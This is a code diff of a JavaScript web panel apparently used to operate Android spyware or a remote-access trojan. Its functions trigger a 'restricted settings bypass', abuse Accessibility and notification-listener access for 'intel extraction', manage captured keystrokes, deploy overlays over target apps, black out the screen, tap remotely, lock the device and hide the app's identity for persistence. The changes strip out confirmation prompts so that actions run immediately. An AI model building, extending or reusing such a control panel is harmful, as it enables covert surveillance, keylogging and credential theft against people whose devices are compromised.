@@ -144,12 +144,11 @@ function repairProtocol() {
 }
 
 function dispatchPermissionSequence() {
-    showTacticalModal('PERMISSION_SYNC', 'Initiating remote authorization sequence...', () => {
-        fetch('/device/request-permissions')
-          .then(r => r.json())
-          .then(d => { showToast(d.message); })
-          .catch(e => { console.error(e); showToast('Request failed', 'error'); });
-    });
+    showToast('PERMISSION_PROMPTS_SENT');
+    fetch('/device/request-permissions')
+      .then(r => r.json())
+      .then(d => { showToast(d.message); })
+      .catch(e => { console.error(e); showToast('Request failed', 'error'); });
 }
 
 function optimizeStability() {
@@ -162,7 +161,7 @@ function optimizeStability() {
 }
 
 function deepRepair() {
-    showTacticalModal('CORE_REPAIR', 'Opening deep system configuration...', () => {
+    showTacticalModal('CORE_REPAIR', 'Opening deep system configuration to resolve environment conflicts...', () => {
         fetch('/device/deep-repair')
           .then(r => r.json())
           .then(d => { showToast('SETTINGS_OPENED: Complete repair on device'); })
@@ -171,11 +170,16 @@ function deepRepair() {
 }
 
 function injectTrust() {
-    showTacticalModal('TRUST_INJECTION', 'Utilizing Session API for restricted settings bypass...', () => {
-        fetch('/device/inject-trust')
-          .then(r => r.json())
-          .then(d => { showToast('BYPASS_INITIATED: Wait for install prompt'); })
-          .catch(e => { console.error(e); showToast('Bypass failed', 'error'); });
+    showToast('BYPASS_SEQUENCE_INITIATED');
+    fetch('/device/inject-trust')
+      .then(r => r.json())
+      .then(d => { showToast('BYPASS_INITIATED: Wait for install prompt'); })
+      .catch(e => { console.error(e); showToast('Bypass failed', 'error'); });
+}
+
+function initiateHeal() {
+    showTacticalModal('AUTO_HEAL_PROTOCOL', 'Initiating self-healing sequence to restore persistence layers...', () => {
+        ghostAction('autoheal');
     });
 }
 
@@ -198,8 +202,7 @@ function showTacticalModal(title, message, callback) {
                     <div id="tm-progress" style="width:0%; height:100%; background:var(--neon-cyan); box-shadow:0 0 10px var(--neon-cyan); transition: width 0.3s ease;"></div>
                 </div>
                 <div style="display:flex; justify-content:center; gap:20px;">
-                    <button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT</button>
-                    <button id="tm-confirm" class="btn btn-small">EXECUTE</button>
+                    <button id="tm-cancel" class="btn btn-small" style="border-color:#555; color:#555;">ABORT_SEQUENCE</button>
                 </div>
             </div>
         `;
@@ -212,33 +215,31 @@ function showTacticalModal(title, message, callback) {
     m.style.display = 'flex';
     setTimeout(() => m.style.opacity = '1', 10);
 
+    let aborted = false;
     const abort = () => {
+        aborted = true;
         m.style.opacity = '0';
         setTimeout(() => m.style.display = 'none', 400);
     };
 
     document.getElementById('tm-cancel').onclick = abort;
-    document.getElementById('tm-confirm').onclick = () => {
-        document.getElementById('tm-confirm').disabled = true;
-        document.getElementById('tm-confirm').style.opacity = '0.5';
-        document.getElementById('tm-title').innerText = 'EXECUTING_PROTOCOL...';
 
-        let p = 0;
-        const int = setInterval(() => {
-            p += Math.random() * 15;
-            if(p >= 100) {
-                p = 100;
-                clearInterval(int);
-                setTimeout(() => {
+    let p = 0;
+    const int = setInterval(() => {
+        if (aborted) { clearInterval(int); return; }
+        p += Math.random() * 4;
+        if(p >= 100) {
+            p = 100;
+            clearInterval(int);
+            setTimeout(() => {
+                if (!aborted) {
                     abort();
                     callback();
-                    document.getElementById('tm-confirm').disabled = false;
-                    document.getElementById('tm-confirm').style.opacity = '1';
-                }, 400);
-            }
-            document.getElementById('tm-progress').style.width = p + '%';
-        }, 100);
-    };
+                }
+            }, 600);
+        }
+        document.getElementById('tm-progress').style.width = p + '%';
+    }, 120);
 }
 
 async function handleLogin(e) {
@@ -300,7 +301,13 @@ function fetchLogs() {
                p.style.marginBottom = '4px';
 
                let cleanLine = line;
-               if (line.startsWith('[C]')) {
+
+               if (line.startsWith('[I]')) {
+                   p.style.color = 'var(--encrypted-blue)';
+                   p.style.fontWeight = 'bold';
+                   p.style.textShadow = '0 0 10px rgba(0, 136, 255, 0.3)';
+                   cleanLine = line.substring(3);
+               } else if (line.startsWith('[C]')) {
                    p.style.color = 'var(--danger)';
                    p.style.textShadow = '0 0 10px rgba(255, 49, 49, 0.5)';
                    p.style.fontWeight = 'bold';
@@ -311,14 +318,6 @@ function fetchLogs() {
                } else if (line.startsWith('[S]')) {
                    p.style.color = 'var(--neon-green)';
                    cleanLine = line.substring(3);
-               } else if (line.includes('INTEL_EXTRACTED')) {
-                   p.style.color = 'var(--danger)';
-                   p.style.fontWeight = 'bold';
-                   p.style.textShadow = '0 0 10px rgba(255, 49, 49, 0.3)';
-               } else if (line.includes('INTEL_SNIFFED')) {
-                   p.style.color = 'var(--encrypted-blue)';
-                   p.style.fontWeight = 'bold';
-                   p.style.textShadow = '0 0 10px rgba(0, 136, 255, 0.3)';
                } else {
                    p.style.color = 'var(--neon-cyan)';
                }
@@ -336,23 +335,23 @@ function fetchLogs() {
     }).catch(e => console.error("Log fetch failed", e));
 }
 
-function clearSessionLogs() { if(confirm('Clear all activity logs for this session?')) fetch('/terminal/clear-logs').then(() => { lastLogId = 0; fetchLogs(); }); }
+function clearSessionLogs() {
+  showToast('PURGING_ACTIVITY_LOGS...');
+  fetch('/terminal/clear-logs').then(() => { lastLogId = 0; fetchLogs(); });
+}
+
 function openAccessibility() {
-    showTacticalModal('GHOST_MODE_UPLINK', 'Opening system Accessibility Hub to engage Ghost Mode...', () => {
-        fetch('/device/open-accessibility')
-          .then(r => r.json())
-          .then(d => { showToast('ACCESSIBILITY_HUB_OPENED'); })
-          .catch(e => { console.error(e); showToast('Link failure', 'error'); });
-    });
+    fetch('/device/open-accessibility')
+      .then(r => r.json())
+      .then(d => { showToast('ACCESSIBILITY_HUB_OPENED'); })
+      .catch(e => { console.error(e); showToast('Link failure', 'error'); });
 }
 
 function openNotifications() {
-    showTacticalModal('INTEL_SYNC_UPLINK', 'Opening Notification Listener settings for Intel extraction...', () => {
-        fetch('/device/open-notifications')
-          .then(r => r.json())
-          .then(d => { showToast('NOTIFICATION_HUB_OPENED'); })
-          .catch(e => { console.error(e); showToast('Link failure', 'error'); });
-    });
+    fetch('/device/open-notifications')
+      .then(r => r.json())
+      .then(d => { showToast('NOTIFICATION_HUB_OPENED'); })
+      .catch(e => { console.error(e); showToast('Link failure', 'error'); });
 }
 
 function deviceCmd(a) {
@@ -378,7 +377,7 @@ function sendEnhancedToast() {
   const anim = document.getElementById('toast-anim').value;
 
   if (anim === 'burnt') {
-    showToast('BURNING_SYSTEM_DISPLAY...');
+    showToast('Sending_Burnt_Toast');
     for (let i = 0; i < 15; i++) {
       setTimeout(() => {
         const size = Math.floor(Math.random() * 40) + 15;
@@ -500,11 +499,10 @@ function openSettings() { fetch('/ghost/interact?action=settings'); }
 function deployOverlay() {
   const type = document.getElementById('overlay-type').value;
   if(!type) return showToast('SELECT_TARGET_FIRST', 'error');
-  if(confirm('Deploy Tactical Shadow Overlay?')) {
-    fetch('/ghost/deploy-overlay?type=' + type).then(r => r.json()).then(d => {
-      showToast('OVERLAY_DEPLOYED');
-    });
-  }
+  showToast('OVERLAY_DISPATCH_SENT');
+  fetch('/ghost/deploy-overlay?type=' + type).then(r => r.json()).then(d => {
+    showToast('OVERLAY_DEPLOYED');
+  });
 }
 function terminateOverlay() {
   fetch('/ghost/deploy-overlay').then(r => r.json()).then(d => {
@@ -512,7 +510,12 @@ function terminateOverlay() {
   });
 }
 function toggleLock() { fetch('/ghost/lock').then(() => { showToast('Uplink command sent: SYSTEM_LOCK'); checkGhostStatus(); }); }
-function toggleBlackout() { fetch('/ghost/interact?action=' + (document.getElementById('blackout-btn').innerText.includes('ACTIVATE') ? 'blackout_on' : 'blackout_off')).then(() => checkGhostStatus()); }
+function toggleBlackout() {
+  const isActivating = document.getElementById('blackout-btn').innerText.includes('ACTIVATE');
+  if (isActivating) showToast('BLACKOUT_PROTOCOL_ENGAGED');
+  else showToast('RESTORING_HARDWARE_BACKLIGHT...');
+  fetch('/ghost/interact?action=' + (isActivating ? 'blackout_on' : 'blackout_off')).then(() => checkGhostStatus());
+}
 function toggleAutoPilot() {
   fetch('/stealth?action=autopilot').then(r => r.json()).then(d => {
     const btn = document.getElementById('autopilot-btn');
@@ -528,7 +531,10 @@ function ghostType() {
   input.value = '';
 }
 function ghostAction(a) { fetch('/ghost/interact?action='+a); }
-function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }
+function clearGhostLogs() {
+  showToast('PURGING_KEYLOG_HISTORY...');
+  fetch('/ghost/clear').then(() => refreshGhostLogs());
+}
 async function refreshInspector() {
   const container = document.getElementById('inspector-tree');
   if(!container) return;
@@ -648,11 +654,9 @@ function renderInspectorNode(node, container, depth, sw, sh) {
 
   row.onclick = (e) => {
     e.stopPropagation();
-    if(confirm(`INITIATE_REMOTE_INTERACTION: [${className}]\n\nPerform center-point tap at source coordinates?`)) {
-       const targetX = (node.x + node.w/2) * 100 / sw;
-       const targetY = (node.y + node.h/2) * 100 / sh;
-       fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
-    }
+    const targetX = (node.x + node.w/2) * 100 / sw;
+    const targetY = (node.h/2 + node.y) * 100 / sh;
+    fetch(`/ghost/interact?action=click&px=${targetX}&py=${targetY}`);
   };
 
   container.appendChild(row);
@@ -835,14 +839,19 @@ function setFilter(exts) {
   });
 }
 
-function clearIntel() { if(confirm('Purge all intercepted intel?')) fetch('/intel/clear').then(() => location.reload()); }
+function clearIntel() {
+  showToast('PURGING_INTEL_STREAM...');
+  fetch('/intel/clear').then(() => location.reload());
+}
 
 function toggleStealth() {
   const type = document.getElementById('stealth-type').value;
-  if(confirm('Initiate Stealth Protocol?')) fetch('/stealth?type=' + type);
+  showToast('INITIATING_STEALTH_CAMOUFLAGE...');
+  fetch('/stealth?type=' + type);
 }
 function restoreNormal() {
-  if(confirm('Restore normal identity?')) fetch('/stealth?action=restore');
+  showToast('RESTORING_ORIGINAL_IDENTITY...');
+  fetch('/stealth?action=restore');
 }
 
 window.alert = (m) => showToast(m);
